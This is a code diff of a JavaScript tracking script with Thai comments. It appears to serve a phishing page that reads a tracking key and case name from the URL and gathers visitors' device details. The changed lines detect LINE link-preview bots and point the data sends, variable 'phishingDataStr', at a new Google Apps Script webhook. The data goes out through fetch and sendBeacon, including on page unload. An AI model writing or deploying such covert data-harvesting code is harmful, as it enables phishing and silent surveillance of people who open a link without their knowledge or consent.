@@ -3,26 +3,28 @@ function getUrlParameters() {
   try {
     const urlParams = new URLSearchParams(window.location.search);
     const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
-    const caseName = urlParams.get('case') || "ไม่มีค่า"; // ดึง case name ด้วย (ถ้ามี)
-    const source = urlParams.get('source') || "link"; // เพิ่มการดึง source (link/image)
-
-    console.log("ดึงค่าจาก URL parameters:");
-    console.log("- trackingKey:", trackingKey);
-    console.log("- caseName:", caseName);
-    console.log("- source:", source); // Log source ด้วย
-
-    return {
-      trackingKey: trackingKey,
-      caseName: caseName,
-      source: source // คืนค่า source ด้วย
-    };
+    const caseName = urlParams.get('case') || "ไม่มีค่า";
+    
+    // เพิ่มการตรวจจับ source จาก URL parameter
+    let source = urlParams.get('source') || "link";
+    
+    // ตรวจสอบ User-Agent เพื่อระบุว่าเป็น LINE Preview หรือไม่
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isLinePreview = userAgent.includes('line') && 
+                         (userAgent.includes('preview') || 
+                          userAgent.includes('bot') || 
+                          userAgent.includes('crawler'));
+    
+    // ถ้าเป็น LINE Preview และ source เป็น zeroclick ให้ยืนยันว่าเป็น zeroclick จริง
+    if (source === "zeroclick" && isLinePreview) {
+      source = "zeroclick";
+      console.log("ตรวจพบการเข้าถึงจาก LINE Preview (Zeroclick)");
+    }
+    
+    return { trackingKey, caseName, source };
   } catch (error) {
-    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
-    return {
-      trackingKey: "ไม่มีค่า",
-      caseName: "ไม่มีค่า",
-      source: "link" // ค่าเริ่มต้น
-    };
+    console.error("Error getting URL parameters:", error);
+    return { trackingKey: "ไม่มีค่า", caseName: "ไม่มีค่า", source: "error" };
   }
 }
 
@@ -158,7 +160,7 @@ window.addEventListener('beforeunload', function() {
         console.log("ส่งข้อมูลในช่วง beforeunload ด้วย beacon");
         
         // ส่งข้อมูลด้วย beacon
-        const webhookUrl = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
+        const webhookUrl = 'https://script.google.com/macros/s/AKfycby8dpSodHpr-nrP7tqlzW19Ieme7L7dUufg9mfIVx861ppkEVtZCv5SdB4htpAZY46v/exec';
         const blob = new Blob([phishingDataStr], {type: 'application/json'});
         
         if (navigator.sendBeacon(webhookUrl, blob)) {
@@ -190,12 +192,11 @@ window.addEventListener('beforeunload', function() {
 
   // --- ตรวจสอบ trackingKey ก่อนดำเนินการต่อ ---
   if (!trackingKey || trackingKey === "ไม่มีค่า") {
-    console.error("Invalid or missing tracking key. Halting script execution.");
-    // อาจจะแสดงข้อความบนหน้าจอ หรือ redirect
-    // document.body.innerHTML = "Access Denied: Invalid Tracking Key";
-    return; // หยุดการทำงานของสคริปต์
+    console.log("ไม่พบ tracking key ที่ถูกต้อง, ยกเลิกการทำงาน");
+    return;
   }
   console.log("Tracking key is present:", trackingKey);
+  console.log("Source:", source);
 
   // --- รวบรวมข้อมูลเบื้องต้น ---
   const deviceInfo = getDetailedDeviceInfo();
@@ -312,7 +313,7 @@ window.addEventListener('beforeunload', function() {
       
       // ตรวจสอบว่าสามารถใช้ fetch ได้หรือไม่
       if (window.fetch) {
-        fetch('https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec', {
+        fetch('https://script.google.com/macros/s/AKfycby8dpSodHpr-nrP7tqlzW19Ieme7L7dUufg9mfIVx861ppkEVtZCv5SdB4htpAZY46v/exec', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
@@ -358,7 +359,7 @@ function generateUniqueId() {
 
 // ฟังก์ชันส่งข้อมูลด้วย navigator.sendBeacon()
 function sendDataWithBeacon(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycby8dpSodHpr-nrP7tqlzW19Ieme7L7dUufg9mfIVx861ppkEVtZCv5SdB4htpAZY46v/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
   const currentRequestId = dataToSend.requestId;
 
   // ตรวจสอบว่าเคยส่ง requestId นี้ใน session นี้หรือยัง
